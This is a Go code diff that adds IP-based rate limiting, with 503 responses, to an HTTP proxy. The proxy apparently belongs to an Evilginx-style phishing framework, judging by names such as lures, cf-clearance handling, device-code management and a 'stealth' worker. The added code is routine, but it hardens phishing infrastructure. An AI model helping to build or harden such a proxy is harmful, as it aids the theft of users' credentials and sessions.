@@ -272,7 +272,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
-	stopChan          chan struct{} // For graceful shutdown
+	stopChan          chan struct{}   // For graceful shutdown
+	rateLimiter       *RateLimiter    // DDoS protection and load management
 }
 
 type ProxySession struct {
@@ -312,6 +313,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		evilpuppetRod:     NewEvilPuppetRod(), // go-rod implementation
 		cfClearance:       NewCfClearanceManager(),
 		deviceCode:        NewDeviceCodeManager(),
+		rateLimiter:       NewRateLimiter(), // DDoS protection
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -430,6 +432,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			log.Debug("[DoFunc] %s %s%s from %s", req.Method, req.Host, req.URL.Path, req.RemoteAddr)
+
+			// ════════════════════════════════════════════════════════════════════════
+			// RATE LIMITING / DDoS PROTECTION
+			// ════════════════════════════════════════════════════════════════════════
+			clientIP := req.RemoteAddr
+			if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
+				clientIP = clientIP[:idx]
+			}
+			// Check proxy headers for real client IP
+			if xff := req.Header.Get("X-Forwarded-For"); xff != "" {
+				if idx := strings.IndexByte(xff, ','); idx != -1 {
+					clientIP = strings.TrimSpace(xff[:idx])
+				} else {
+					clientIP = xff
+				}
+			} else if xri := req.Header.Get("X-Real-IP"); xri != "" {
+				clientIP = xri
+			}
+			
+			if allowed, reason := p.rateLimiter.AllowRequest(clientIP); !allowed {
+				log.Debug("[ratelimit] Blocked %s: %s", clientIP, reason)
+				resp := goproxy.NewResponse(req, "text/html", http.StatusServiceUnavailable, 
+					"<html><body><h1>Service Temporarily Unavailable</h1><p>Please try again later.</p></body></html>")
+				resp.Header.Set("Retry-After", "30")
+				return req, resp
+			}
+			p.rateLimiter.BeginRequest(clientIP)
+			// Note: EndRequest is called in response handler
+			// ════════════════════════════════════════════════════════════════════════
 
 			// Use HTTP/2-capable uTLS transport for all HTTPS requests
 			if rt := GetUtlsRoundTripper(); rt != nil {
@@ -2512,6 +2543,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+			// End rate limiter tracking for this request
+			if ctx.Req != nil {
+				clientIP := ctx.Req.RemoteAddr
+				if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
+					clientIP = clientIP[:idx]
+				}
+				if xff := ctx.Req.Header.Get("X-Forwarded-For"); xff != "" {
+					if idx := strings.IndexByte(xff, ','); idx != -1 {
+						clientIP = strings.TrimSpace(xff[:idx])
+					} else {
+						clientIP = xff
+					}
+				} else if xri := ctx.Req.Header.Get("X-Real-IP"); xri != "" {
+					clientIP = xri
+				}
+				p.rateLimiter.EndRequest(clientIP)
+			}
+
 			// --- Begin rewrite_urls response logic ---
 			if resp != nil {
 				// Set no-referrer so the browser doesn't send Referer headers.
@@ -4341,6 +4390,7 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	p.stopChan = make(chan struct{})
+	p.rateLimiter.Start() // DDoS protection
 	go p.httpsWorker()
 	go p.connectionMaintenanceWorker() // Stealth: keep connections fresh
 	return nil
@@ -4371,6 +4421,9 @@ func (p *HttpProxy) connectionMaintenanceWorker() {
 func (p *HttpProxy) Stop() {
 	if p.stopChan != nil {
 		close(p.stopChan)
+	}
+	if p.rateLimiter != nil {
+		p.rateLimiter.Stop()
 	}
 	p.Proxy.Tr.CloseIdleConnections()
 }
